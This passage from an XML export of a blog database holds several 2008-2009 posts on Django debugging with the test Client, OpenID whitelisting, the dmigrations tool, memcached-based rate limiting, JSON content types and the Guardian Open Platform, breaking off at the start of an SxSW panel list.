&lt;p&gt;A final tip for exploring your application interactively is to learn to use &lt;a href=&quot;http://www.djangoproject.com/documentation/testing/&quot;&gt;Django's TestClient&lt;/a&gt;. Although designed for use in unit tests, this tool is equally useful for use at the interactive prompt. It allows you to simulate an in-process request against your application from within your Python code. Here's an example:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; from django.test.client import Client
&amp;gt;&amp;gt;&amp;gt; c = Client()
&amp;gt;&amp;gt;&amp;gt; response = c.get(&amp;quot;/&amp;quot;) # The homepage
&amp;gt;&amp;gt;&amp;gt; response
&amp;lt;django.http.HttpResponse object at 0x2300470&amp;gt;
&amp;gt;&amp;gt;&amp;gt; print response
Vary: Cookie
Content-Type: text/html; charset=utf-8

&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//W3C//DTD HTML 4.01//EN&amp;quot;
    &amp;quot;http://www.w3.org/TR/html4/strict.dtd&amp;quot;&amp;gt;
&amp;lt;html&amp;gt;
...&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The response object you get back is the &lt;code class=&quot;python&quot;&gt;HttpResponse&lt;/code&gt; returned by the view, ready to be explored interactively.&lt;/p&gt;

&lt;p&gt;There's another function from the unit testing tools that can help with interactively exploring an application: &lt;code class=&quot;python&quot;&gt;setup_test_environment()&lt;/code&gt;. This function monkey-patches in some additional hooks used by the unit tests, including one that intercepts template render calls and adds information on them to the request object. Here's an example:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; from django.test.utils import setup_test_environment
&amp;gt;&amp;gt;&amp;gt; setup_test_environment()
&amp;gt;&amp;gt;&amp;gt; from django.test.client import Client
&amp;gt;&amp;gt;&amp;gt; c = Client()
&amp;gt;&amp;gt;&amp;gt; response = c.get(&amp;quot;/&amp;quot;)
&amp;gt;&amp;gt;&amp;gt; response.template
[&amp;lt;django.template.Template object at 0x2723dd0&amp;gt;,
 &amp;lt;django.template.Template object at 0x2723f30&amp;gt;,
 &amp;lt;django.template.Template object at 0x273ee10&amp;gt;]
&amp;gt;&amp;gt;&amp;gt; response.context
[ list of Context objects ]&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This allows you to explore not just the HTML returned by a view, but also the templates and contexts that were used to render it.&lt;/p&gt;

&lt;h4&gt;Your tips welcome&lt;/h4&gt;

&lt;p&gt;If you have any useful tips on debugging Django applications, please share them in the comments on this entry.&lt;/p&gt;</field>
		<field name="created">2008-05-22 00:35:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1578</field>
		<field name="title">The point of &quot;Open&quot; in OpenID</field>
		<field name="slug">openid</field>
		<field name="body">&lt;p&gt;TechCrunch report that &lt;a href=&quot;http://www.techcrunch.com/2008/06/23/microsofts-first-step-in-accepting-openid-signons-healthvault/&quot;&gt;Microsoft are accepting OpenID&lt;/a&gt; for their new &lt;a href=&quot;http://www.healthvault.com/&quot;&gt;HealthVault site&lt;/a&gt;, but with a catch: you can only use OpenIDs from two providers: &lt;a href=&quot;http://www.trustbearer.com/&quot;&gt;Trustbearer&lt;/a&gt; (who offer two-factor authentication using a hardware token) and Verisign. &quot;Whatever happened to the &lt;em&gt;Open&lt;/em&gt; in OpenID?&quot;, asks TechCrunch's Jason Kincaid.&lt;/p&gt;

&lt;p&gt;Microsoft's decision is a beautiful example of the Open in action, and I fully support it.&lt;/p&gt;

&lt;p&gt;You have to remember that behind the excitement and marketing OpenID is a protocol, just like SMTP or HTTP. All OpenID actually provides is a mechanism for asserting ownership over a URL and then &quot;proving&quot; that assertion. We can build a pyramid of interesting things on top of this, but that assertion is really all OpenID gives us (well, that and a globally unique identifier). In internet theory terms, it's a &lt;a href=&quot;http://en.wikipedia.org/wiki/Dumb_network&quot;&gt;dumb network&lt;/a&gt;: the protocol just concentrates on passing assertions around; it's up to the endpoints to set policies and invent interesting applications.&lt;/p&gt;

&lt;p&gt;Open means that providers and consumers are free to use the protocol in whatever way they wish. If they want to only accept OpenID from a trusted subset of providers, they can go ahead. If they only want to pass OpenID details around behind the corporate firewall (great for gluing together an SSO network from open-source components) they can knock themselves out. Just like SMTP or HTTP, the protocol does not imply any rules about where or how it should be used.&lt;/p&gt;

&lt;p&gt;HealthVault have clearly made this decision due to security concerns - not over the OpenID protocol itself, but the providers that their users might choose to trust. By accepting OpenID on your site you are &lt;em&gt;outsourcing the security of your users&lt;/em&gt; to an unknown third party, and you can't guarantee that your users picked a good home for their OpenID. If you're a bank or a healthcare provider that's not a risk you want to take; whitelisting providers that you have audited for security means you don't have to rule out OpenID entirely.&lt;/p&gt;

&lt;p&gt;I have a very simple rule of thumb for whether or not a site should consider whitelisting OpenID providers: does the site offer a &quot;forgotten password&quot; feature that e-mails the user a login token? If it does, then the owners have already made the decision to outsource the security of their users to whoever they picked as an e-mail provider. If they don't (banks are a good example here) they should continue that policy decision and consider using an OpenID provider whitelist.&lt;/p&gt;

&lt;p&gt;I've been using the example of banks potentially accepting OpenID only from security audited providers in my &lt;a href=&quot;http://simonwillison.net/talks/openid/&quot;&gt;talks on OpenID&lt;/a&gt; for at least the past year. Now I can finally provide a real-world example.&lt;/p&gt;</field>
		<field name="created">2008-06-24 08:12:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1579</field>
		<field name="title">Back to full-time employment</field>
		<field name="slug">employment</field>
		<field name="body">&lt;p&gt;I've been freelance for a year and a half now, and it's been a great deal of fun. For me, being freelance meant having the freedom to pursue all sorts of different interests - technical writing, public speaking, Django, OpenID, JavaScript - and the opportunity to work with some really fantastic people.&lt;/p&gt;

&lt;p&gt;It was going to take a very special opportunity to pull me back in to full-time employment, but I believe I've found that opportunity at &lt;a href=&quot;http://www.guardian.co.uk/&quot;&gt;the Guardian&lt;/a&gt;. I'll be joining them full time (well, four days a week) in mid-October as a software architect, collaborating with their development team on some ambitious API projects. The Guardian have access to a &lt;em&gt;lot&lt;/em&gt; of interesting data and I can't wait to get stuck in to it. Since they're a newspaper, it shouldn't be a surprise that they &lt;a href=&quot;http://www.guardian.co.uk/media/2008/aug/22/guardianmediagroup.digitalmedia&quot;&gt;scooped me to the story&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I'll be particularly sorry to say good-bye to the outstanding team I've been working with at &lt;a href=&quot;http://www.gcapmedia.com/&quot;&gt;GCap&lt;/a&gt;. I'm looking forward to talking about some of the things we've been working together over the next few weeks.&lt;/p&gt;
</field>
		<field name="created">2008-08-22 17:26:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1580</field>
		<field name="title">Announcing dmigrations</field>
		<field name="slug">dmigrations</field>
		<field name="body">&lt;p&gt;The team at &lt;a href=&quot;http://www.thisisglobal.com/&quot;&gt;Global Radio&lt;/a&gt; (formerly &lt;a href=&quot;http://www.gcapmedia.com/&quot;&gt;GCap Media&lt;/a&gt;) is the largest group of Django developers I've personally worked with, consisting of 14 developers split into two scrum teams, all contributing to the same overall codebase.&lt;/p&gt;

&lt;p&gt;Working with that many developers makes smart tools and processes essential, and in some cases we've had to develop our own. Today, we're releasing one of them as an open source project.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://code.google.com/p/dmigrations/&quot;&gt;dmigrations&lt;/a&gt; is a Django migrations tool. It addresses a common problem in Django development: if you change a model after creating the database tables for it with &lt;code&gt;syncdb&lt;/code&gt;, how do you reflect those changes in your database tables without blowing away your existing data and starting again from scratch?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://code.google.com/p/django-evolution/&quot;&gt;django-evolution&lt;/a&gt; attempts to address this problem the clever way, by detecting changes to models that are not yet reflected in the database schema and figuring out what needs to be done to bring the two back in sync. In contrast, dmigrations takes the stupid approach: it requires you to explicitly state the changes in a sequence of migrations, which will be applied in turn to bring a database up to the most recent state that reflects the underlying models.&lt;/p&gt;

&lt;p&gt;This means extra work for developers who create migrations, but it also makes the whole process completely transparent - for our projects, we decided to go with the simplest system that could possibly work.&lt;/p&gt;

&lt;p&gt;The interface to dmigrations is a pair of custom Django commands. The first, &lt;code&gt;./manage.py dmigrate&lt;/code&gt;, provides a set of command for listing, applying and unapplying (reverting) migrations. This entirely replaces Django's &lt;code&gt;syncdb&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;The second, &lt;code&gt;./manage.py dmigration&lt;/code&gt;, provides commands for code-generating new migrations. It turns out that most migrations fit a set of common patterns: add a new table, add the tables for a new Django application, add a column to an existing table, add an index. These common cases are handled by dmigration; if you want to do something more complex (rename a column while transforming its data for example) you'll need to write a custom migration class.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;http://code.google.com/p/dmigrations/wiki/DmigrationsTutorial&quot;&gt;dmigrations tutorial&lt;/a&gt; provides a full introduction to both of these commands, as well as hints on writing your own custom migrations. Since migrations are just classes, one of our hopes is that external developers will write extra migration classes for operations like &quot;rename column&quot; - things that currently require a one-off custom migration.&lt;/p&gt;

&lt;p&gt;dmigrations is actually the third iteration of our in-house migrations system. The first, smigrations, was designed to do the least amount of work possible to give us a controlled way of applying changes to our database schemas. The 's' stood for 'simple'. The second version (dmigrations) written by &lt;a href=&quot;http://t-a-w.blogspot.com/&quot;&gt;Tomasz Wegrzanowski&lt;/a&gt; consisted of a major upgrade to smigrations that addressed many of the frustrations we found when using it with branched development, in particular the problem of migrations in two branches conflicting with each other. The 'd' stood for 'distributed'.&lt;/p&gt;

&lt;p&gt;Version three, released today, is my refactoring of dmigrations to de-couple it from the rest of our codebase. I've also stubbed out hooks for adding support for alternative database engines; dmigrations only supports MySQL out of the box, but I'm keen on getting it working with other databases now that it's out in the wild. Patches welcome!&lt;/p&gt;

&lt;p&gt;How does this fit in with &lt;a href=&quot;http://south.aeracode.org/&quot;&gt;South&lt;/a&gt; and &lt;a href=&quot;http://code.google.com/p/django-evolution/&quot;&gt;django-evolution&lt;/a&gt;?&lt;/p&gt;

&lt;p&gt;That's an excellent question. We'll be discussing all three systems on the schema evolution panel at &lt;a href=&quot;http://djangocon.org/&quot;&gt;DjangoCon&lt;/a&gt; this weekend. I would love to see co-operation between the projects; at the very least I'd like to see the emergence of a standard Django-style abstraction library for create/alter table statements (something we punted on entirely with dmigrations). You'll certainly be hearing a lot more about migrations in Django after the conference.&lt;/p&gt;</field>
		<field name="created">2008-09-03 19:17:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1581</field>
		<field name="title">DjangoCon and PyCon UK</field>
		<field name="slug">conferences</field>
		<field name="body">&lt;p&gt;September is a big month for conferences. &lt;a href=&quot;http://djangocon.org/&quot;&gt;DjangoCon&lt;/a&gt; was a weekend ago in Mountain View (forcing me to miss both &lt;a href=&quot;http://2008.dconstruct.org/&quot;&gt;d.Construct&lt;/a&gt; and &lt;a href=&quot;http://barcamp.org/BarCampBrighton3&quot;&gt;BarCamp Brighton&lt;/a&gt;), &lt;a href=&quot;http://pyconuk.org/&quot;&gt;PyCon UK&lt;/a&gt; was this weekend in Birmingham, I'm writing this from &lt;a href=&quot;http://vivabit.com/atmediaAjax/&quot;&gt;@media Ajax&lt;/a&gt; and &lt;a href=&quot;http://barcamp.org/BarCampLondon5&quot;&gt;BarCamp London 5&lt;/a&gt; is coming up over another weekend at the end of this month. As always, I've been posting details of upcoming talks and notes and materials from previous ones on &lt;a href=&quot;http://simonwillison.net/2008/talks/&quot;&gt;my talks page&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;DjangoCon went really, really well. Huge thanks to conference chair &lt;a href=&quot;http://www.siudesign.co.uk/&quot;&gt;Robert Lofthouse&lt;/a&gt; for pulling it all together in just two months and &lt;a href=&quot;http://www.hawthornlandings.org/&quot;&gt;Leslie Hawthorne&lt;/a&gt; for making it all happen from Google's end. Google's facitilies were superb: the AV team were the best I've ever worked with and an army of Google volunteers made sure everything went smoothly. It's hard to see how it could have gone better; the principle complaint we got was that at only two days it was hard to justify the travel, something which future DjangoCons will definitely address.&lt;/p&gt;

&lt;p&gt;Every session was recorded and the videos &lt;del&gt;should be going up on YouTube shortly&lt;/del&gt; &lt;a href=&quot;http://www.youtube.com/view_play_list?p=D415FAF806EC47A1&quot;&gt;are now up on YouTube&lt;/a&gt;. For the impatient, you can subscribe to an &lt;a href=&quot;http://gdata.youtube.com/feeds/api/videos?vq=DjangoCon&quot;&gt;Atom feed of a YouTube search for &quot;DjangoCon&quot;&lt;/a&gt;. I recommend starting with Cal Henderson's keynote &lt;a href=&quot;http://www.youtube.com/watch?v=i6Fr65PFqfk&quot;&gt;&quot;Why I hate Django&quot;&lt;/a&gt; which was both funny and insightful in equal parts. Malcolm's talk on &lt;a href=&quot;http://www.youtube.com/watch?v=zlhyp5Ve2qk&quot;&gt;ORM internals&lt;/a&gt; was another personal favourite.&lt;/p&gt;

&lt;p&gt;PyCon UK was the second I've attended, but last year I only stayed for the first day. This time I stuck around and was enormously impressed by the grassroots feel of the conference and the enthusiastic atmosphere. I presented &lt;a href=&quot;http://simonwillison.net/2008/talks/pyconuk-admin/&quot;&gt;a tutorial on extending the Django admin&lt;/a&gt; and &lt;a href=&quot;http://simonwillison.net/2008/talks/pyconuk-zeppelins/&quot;&gt;a lightning talk on Zeppelins&lt;/a&gt;, prepared two hours in advance after Jacob mentioned that the lightning talks were tending too much towards the technical side. It went down very well; I'm tempted to extend it to a half hour session for BarCamp London.&lt;/p&gt;

&lt;p&gt;Unlike most conferences I attend, PyCon tickets included a sit-down dinner for all attendees complete with a &quot;dramatic lecture&quot; on &lt;a href=&quot;http://en.wikipedia.org/wiki/Lunar_Society&quot;&gt;the Lunar Society&lt;/a&gt; presented by &lt;a href=&quot;http://www.odyssey.dial.pipex.com/&quot;&gt;Andrew Lound&lt;/a&gt;. This was a great fit for the conference, both for the Birmingham connection and the many analogies to the modern open source community - loose collaboration, patent concerns and what you might call an 18th century equivalent of the modern hacker ethic.&lt;/p&gt;

&lt;p&gt;Next year the PyCon UK team will be hosting EuroPython, and I'm certain they'll do an excellent job of it. Meanwhile, Rob has already started making plans for a Euro DjangoCon in around six months time, probably taking place in Prague.&lt;/p&gt;
</field>
		<field name="created">2008-09-15 15:20:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1582</field>
		<field name="title">Rate limiting with memcached</field>
		<field name="slug">ratelimitcache</field>
		<field name="body">&lt;p&gt;On Monday, several high profile &quot;celebrity&quot; Twitter accounts &lt;a href=&quot;http://www.techcrunch.com/2009/01/05/twitter-gets-hacked-badly/&quot; title=&quot;Twitter Gets Hacked, Badly&quot;&gt;started spouting nonsense&lt;/a&gt;, the victims of stolen passwords. Wired &lt;a href=&quot;http://blog.wired.com/27bstroke6/2009/01/professed-twitt.html&quot; title=&quot;Weak Password Brings 'Happiness' to Twitter Hacker&quot;&gt;has the full story&lt;/a&gt; - someone ran a dictionary attack against a Twitter staff member, discovered their password and used Twitter's admin tools to reset the passwords on the accounts they wanted to steal.&lt;/p&gt;

&lt;p&gt;The Twitter incident got me thinking about rate limiting again. I've been wanting a good general solution to this problem for quite a while, for API projects as well as security. Django Snippets has &lt;a href=&quot;http://www.djangosnippets.org/snippets/1083/&quot; title=&quot;Decorator to limit request rates to individual views&quot;&gt;an answer&lt;/a&gt;, but it works by storing access information in the database and requires you to run a periodic purge command to clean up the old records.&lt;/p&gt;

&lt;p&gt;I'm strongly averse to writing to the database for every hit. For most web applications reads scale easily, but writes don't. I also want to avoid filling my database with administrative gunk (I dislike database backed sessions for the same reason). But rate limiting relies on storing state, so there has to be some kind of persistence.&lt;/p&gt;

&lt;h4&gt;Using memcached counters&lt;/h4&gt;

&lt;p&gt;I think I've found a solution, thanks to memcached and in particular the &lt;samp&gt;incr&lt;/samp&gt; command. &lt;samp&gt;incr&lt;/samp&gt; lets you atomically increment an already existing counter, simply by specifying its key. &lt;samp&gt;add&lt;/samp&gt; can be used to create that counter - it will fail silently if the provided key already exists.&lt;/p&gt;

&lt;p&gt;Let's say we want to limit a user to 10 hits every minute. A naive implementation would be to create a memcached counter for hits from that user's IP address in a specific minute. The counter key might look like this:&lt;/p&gt;

&lt;pre&gt;&lt;samp&gt;ratelimit_72.26.203.98_2009-01-07-21:45&lt;/samp&gt;&lt;/pre&gt;

&lt;p&gt;Increment that counter for every hit, and if it exceeds 10 block the request.&lt;/p&gt;

&lt;p&gt;What if the user makes ten requests all in the last second of the minute, then another ten a second later? The rate limiter will let them off. For many cases this is probably acceptable, but we can improve things with a slightly more complex strategy. Let's say we want to allow up to 30 requests every five minutes. Instead of maintaining one counter, we can maintain five - one for each of the past five minutes (older counters than that are allowed to expire). After a few minutes we might end up with counters that look like this:&lt;/p&gt;

&lt;pre&gt;&lt;samp&gt;ratelimit_72.26.203.98_2009-01-07-21:45 = 13
ratelimit_72.26.203.98_2009-01-07-21:46 = 7
ratelimit_72.26.203.98_2009-01-07-21:47 = 11&lt;/samp&gt;&lt;/pre&gt;

&lt;p&gt;Now, on every request we work out the keys for the past five minutes and use &lt;samp&gt;get_multi&lt;/samp&gt; to retrieve them. If the sum of those counters exceeds the maximum allowed for that time period, we block the request.&lt;/p&gt;

&lt;p&gt;Are there any obvious flaws to this approach? I'm pretty happy with it - it cleans up after itself (old counters quietly expire from the cache), it shouldn't use much resources (just five active cache keys per unique IP address at any one time) and if the cache is lost the only snag is that a few clients might go slightly over their rate limit. I don't &lt;em&gt;think&lt;/em&gt; it's possible for an attacker to force the counters to expire early.&lt;/p&gt;

&lt;h4&gt;An implementation for Django&lt;/h4&gt;

&lt;p&gt;I've put together an &lt;a href=&quot;http://github.com/simonw/ratelimitcache/tree/master/ratelimitcache.py&quot;&gt;example implementation of this algorithm&lt;/a&gt; using Django, hosted on GitHub. The &lt;a href=&quot;http://github.com/simonw/ratelimitcache/tree/master/readme.txt&quot;&gt;readme.txt&lt;/a&gt; file shows how it works - basic usage is via a simple decorator:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from ratelimitcache import ratelimit

@ratelimit(minutes = 3, requests = 20)
def myview(request):
    # ...
    return HttpResponse('...')&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Python decorators are typically functions, but &lt;code&gt;ratelimit&lt;/code&gt; is actually a class. This means it can be customised by subclassing it, and the class provides a number of methods designed to be over-ridden. I've provided an example of this in the module itself - ratelimit_post, a decorator which only limits on POST requests and can optionally couple the rate limiting to an individual POST field. Here's the complete implementation:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;class ratelimit_post(ratelimit):
    &quot;Rate limit POSTs - can be used to protect a login form&quot;
    key_field = None # If provided, this POST var will affect the rate limit
    
    def should_ratelimit(self, request):
        return request.method == 'POST'
    
    def key_extra(self, request):
        # IP address and key_field (if it is set)
        extra = super(ratelimit_post, self).key_extra(request)
        if self.key_field:
            value = sha.new(request.POST.get(self.key_field, '')).hexdigest()
            extra += '-' + value
        return extra&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And here's how you would use it to limit the number of times a specific IP address can attempt to log in as a particular user:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;@ratelimit_post(minutes = 3, requests = 10, key_field = 'username')
def login(request):
    # ...
    return HttpResponse('...')&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;should_ratelimit()&lt;/code&gt; method is called before any other rate limiting logic. The default implementation returns True, but here we only want to apply rate limits to POST requests. The &lt;code&gt;key_extra()&lt;/code&gt; method is used to compose the keys used for the counter - by default this just includes the request's IP address, but in &lt;code&gt;ratelimit_post&lt;/code&gt; we can optionally include the value of a POST field (for example the username). We could include things like the request path here to apply different rate limit counters to different URLs.&lt;/p&gt;

&lt;p&gt;Finally, the readme.txt includes &lt;code&gt;ratelimit_with_logging&lt;/code&gt;, an example that over-rides the &lt;code&gt;disallowed()&lt;/code&gt; view returned when a rate limiting condition fails and writes an audit note to a database (less overhead than writing for every request).&lt;/p&gt;

&lt;p&gt;I've been a fan of customisation via subclassing ever since I got to know the new Django admin system, and I've been using it in a bunch of projects. It's a great way to create reusable pieces of code.&lt;/p&gt;
</field>
		<field name="created">2009-01-07 22:27:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1583</field>
		<field name="title">Pragmatism, purity and JSON content types</field>
		<field name="slug">json</field>
		<field name="body">&lt;p&gt;I started a conversation about this on Twitter the other day, but Twitter is a horrible place to have an archived discussion so I'm going to try again here.&lt;/p&gt;

&lt;p&gt;If you're producing a JSON API for other people to use (as opposed to an API that's only really meant for your own local Ajax responses), you need to decide which Content-Type to use. The best option is not entirely obvious.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.ietf.org/rfc/rfc4627.txt&quot;&gt;RFC 4672&lt;/a&gt; defines JSON and reserves &lt;code&gt;application/json&lt;/code&gt; as the preferred media type. The problem is that most browsers will prompt you to download the file rather than displaying it inline (as they would for &lt;code&gt;text/plain&lt;/code&gt; or &lt;code&gt;application/javascript&lt;/code&gt;). One of my favourite qualities of REST-style APIs is that they enable exploration and debugging using just a browser - using &lt;code&gt;application/json&lt;/code&gt; throws a big, frustrating road block in the way. There are ways of telling your browser to treat &lt;code&gt;application/json&lt;/code&gt; in the same way as &lt;code&gt;text/plain&lt;/code&gt; but that doesn't really help you if your aim is to create an API that's easy for other developers to use.&lt;/p&gt;

&lt;p&gt;It's also worth mentioning that if you are returning JSONP (with an extra callback function wrapped around the JSON response to enable the dynamic script tag hack) you HAVE to serve as &lt;code&gt;application/javascript&lt;/code&gt; - otherwise the script you are providing won't be executed by the browser. Don't forget to include &lt;code&gt;charset=UTF8&lt;/code&gt; as well (for both types of response).&lt;/p&gt;

&lt;p&gt;So, it's pragmatism v.s. purity. The &lt;em&gt;correct&lt;/em&gt; thing to do is to return &lt;code&gt;application/json&lt;/code&gt;, but doing so makes your API harder for developers to use.&lt;/p&gt;

&lt;p&gt;In a brief, non-comprehensive review of some existing JSON APIs (FriendFeed, Flickr, Google Social Graph etc) I couldn't find any that were using &lt;code&gt;application/json&lt;/code&gt;, presumably for this exact reason.&lt;/p&gt;

&lt;h4&gt;Using the Accept: header&lt;/h4&gt;

&lt;p&gt;The Accept: header is one of my least favourite parts of HTTP. I like to be confident that if I send a URL to someone, they'll get back exactly the same bytes as I did when I retrieved it myself (I distrust language negotiation for the same reason). However, a number of people suggested it on Twitter and it looks like it could be a useful solution to this problem.&lt;/p&gt;

&lt;p&gt;I'm currently considering the following: ONLY use the &lt;code&gt;application/json&lt;/code&gt; Content-Type in reply to requests that include &lt;code&gt;application/json&lt;/code&gt; in their Accept header - essentially allowing clients that care about the correct content type to opt-in to receiving it. Everyone else (browsers included) gets &lt;code&gt;application/javascript&lt;/code&gt;, which is less correct (though not an all-out lie, since JSON is a subset of JavaScript) but solves the usability problem.&lt;/p&gt;

&lt;p&gt;A couple of things worry me about this. Firstly, is this a reasonable thing to use Accept for? Secondly, is there a chance that browsers might add &lt;code&gt;application/json&lt;/code&gt; to their Accept header at some point in the future? Safari currently sends &lt;code&gt;text/xml,application/xml,application/xhtml+xml,text/html; q=0.9,text/plain; q=0.8,image/png,*/*; q=0.5&lt;/code&gt; while Firefox sends &lt;code&gt;text/html,application/xhtml+xml,application/xml; q=0.9,*/*; q=0.8&lt;/code&gt;. Would it be smarter to look for &lt;code&gt;*/*&lt;/code&gt; and serve the incorrect Content-Type to those requests and the correct one to everything else?&lt;/p&gt;

&lt;p&gt;An alternative is to simply allow people to specify &quot;JSON with a browsable Content-Type&quot; as an alternative format option, or to enable a &quot;pretty=1&quot; query string argument which returns the response as &lt;code&gt;text/plain&lt;/code&gt; and potentially pretty prints it as well. I haven't yet decided if this is better than messing around with the Accept header.&lt;/p&gt;
</field>
		<field name="created">2009-02-06 10:19:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1584</field>
		<field name="title">A few notes on the Guardian Open Platform</field>
		<field name="slug">openplatform</field>
		<field name="body">&lt;p&gt;This morning we launched the &lt;a href=&quot;http://www.guardian.co.uk/open-platform&quot;&gt;Guardian Open Platform&lt;/a&gt; at a well attended event in our new offices in &lt;a href=&quot;http://www.kingsplace.co.uk/&quot;&gt;Kings Place&lt;/a&gt;. This is one of the main projects I've been helping out with since joining the Guardian last year, and it's fantastic to finally have it out in the open.&lt;/p&gt;

&lt;p&gt;There are two components to the launch today: the Content API and the Data Store. I'll describe the Data Store first as it deserves not to get buried in the discussion about its larger cousin.&lt;/p&gt;

&lt;h4&gt;The Data Store&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;http://www.guardian.co.uk/profile/simonrogers&quot;&gt;Simon Rogers&lt;/a&gt; is the Guardian news editor who is principally responsible for gathering data about the world. If you ever see an infographic in the paper, the chances are Simon had a hand in researching the data for it. His delicious feed is a &lt;a href=&quot;http://delicious.com/smfrogers&quot;&gt;positive gold mine&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As of today, a sizeable portion the data he collects for the newspaper will also be published online. As a starting point, we're publishing over &lt;a href=&quot;http://www.guardian.co.uk/data-store&quot;&gt;80 data sets&lt;/a&gt;, all using Google Spreadsheets which means it's all accessible through the &lt;a href=&quot;http://code.google.com/apis/spreadsheets/overview.html&quot;&gt;Spreadsheets Data API&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Here's Simon's take on it, from &lt;a href=&quot;http://www.guardian.co.uk/news/datablog/2009/mar/10/blogpost1&quot;&gt;Welcome to the Datablog&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.guardian.co.uk/news/datablog/2009/mar/10/blogpost1&quot;&gt;&lt;p&gt;Everyday we work with datasets from around the world. We have had to check this data and make sure it's the best we can get, from the most credible sources. But then it lives for the moment of the paper's publication and afterward disappears into a hard drive, rarely to emerge again before updating a year later.&lt;/p&gt;

&lt;p&gt;So, together with its companion site, the Data Store – a directory of all the stats we post – we are opening up that data for everyone. Whenever we come across something interesting or relevant or useful, we'll post it up here and let you know what we're planning to do with it.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;It's worth spending quite a while digging around the data. Most sets come with a full description, including where the data was sourced from. New data sets will be announced &lt;a href=&quot;http://www.guardian.co.uk/news/datablog&quot;&gt;on the Datablog&lt;/a&gt;, which is cleverly subtitled &quot;Facts are sacred&quot;.&lt;/p&gt;

&lt;h4&gt;The Content API&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;http://api.guardianapis.com/docs/&quot;&gt;The Content API&lt;/a&gt; provides REST-ish access to over a million items of content, mostly from the last decade but with a few gems that are &lt;a href=&quot;http://www.guardian.co.uk/world/1944/aug/26/france.secondworldwar&quot;&gt;a little bit older&lt;/a&gt;. Various types of content are available - article is the most common, but you can grab information (though not necessarily content) about audio, video, galleries and more. You can retrieve 50 items at a time, and pagination is unlimited (provided you stay below the API's rate limit).&lt;/p&gt;

&lt;p&gt;Articles are provided with their full body content, though this does not currently include any HTML tags (a known issue). It's a good idea to review &lt;a href=&quot;http://www.guardian.co.uk/open-platform/terms-and-conditions&quot;&gt;our terms and conditions&lt;/a&gt;, but you should know that if you opt to republish our article bodies on your site we may ask you to include our ads alongside our content in the future.&lt;/p&gt;

&lt;p&gt;We serve 15 minute HTTP cache headers, but you are allowed to store our content for up to 24 hours. You really, really don't want to store content for longer than that, as in addition to violating our T&amp;amp;Cs you might find yourself inadvertently publishing an article that has been retracted for legal reasons. UK libel laws can be pretty scary.&lt;/p&gt;

&lt;p&gt;In addition to regular search, you can also filter our content using tags. Tags are a core aspect of the Guardian's &lt;a href=&quot;http://www.guardian.co.uk/help/insideguardian+series/an-abc-of-r2&quot;&gt;R2 platform&lt;/a&gt;, being used for keywords, contributors, &quot;series&quot; (used to implement blogs), content types and more. Every item returned by the API includes tags, and the tags can be used to further filter the results.&lt;/p&gt;

&lt;p&gt;We also return a list of filters at the bottom of each page of search results showing the tags that could be used to filter that result set, ordered by the number of results (you may have seen this feature referred to as faceted search or guided navigation). Handy tip: you can use ?count=0 in your search API key to turn off results entirely and just get back the filters section. The race is on to be first to release a tag relationship browser based on this feature.&lt;/p&gt;

&lt;p&gt;API responses can be had in custom XML, JSON or Atom. The Atom format is the least mature at the moment, and we'd welcome suggestions for improving it from the community.&lt;/p&gt;

&lt;p&gt;I released &lt;a href=&quot;http://code.google.com/p/openplatform-python/&quot;&gt;a Python client library&lt;/a&gt; for the API this morning, and we also have libraries for &lt;a href=&quot;http://code.google.com/p/openplatform-ruby/&quot;&gt;Ruby&lt;/a&gt;, &lt;a href=&quot;http://code.google.com/p/openplatform-java/&quot;&gt;Java&lt;/a&gt; and &lt;a href=&quot;http://code.google.com/p/openplatform-php/&quot;&gt;PHP&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We also have an API Explorer (written in JavaScript and jQuery, hosted on the same domain as the API so that it can make Ajax requests) but you'll need an API key to try it out.&lt;/p&gt;

&lt;h4&gt;The bad news&lt;/h4&gt;

&lt;p&gt;The response to the API release has been terrific (check out what &lt;a href=&quot;http://www.tom-watson.co.uk/2009/03/guardian-open-platform/&quot;&gt;Tom Watson&lt;/a&gt; had to say), but as a result it's likely that API key provisions will be significantly lower than the overall demand for them. Please bear with us while we work towards a more widely accessible release.&lt;/p&gt;</field>
		<field name="created">2009-03-10 14:28:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1585</field>
		<field name="title">List of SxSW 2009 panels with &quot;social&quot; in the title</field>
		<field name="slug">sxsw</field>
		<field name="body">&lt;ul&gt;
	&lt;li&gt;A Hard Sell? Social Media &amp;amp; Your Boss&lt;/li&gt;
	&lt;li&gt;Can Social Media End Racism?&lt;/li&gt;
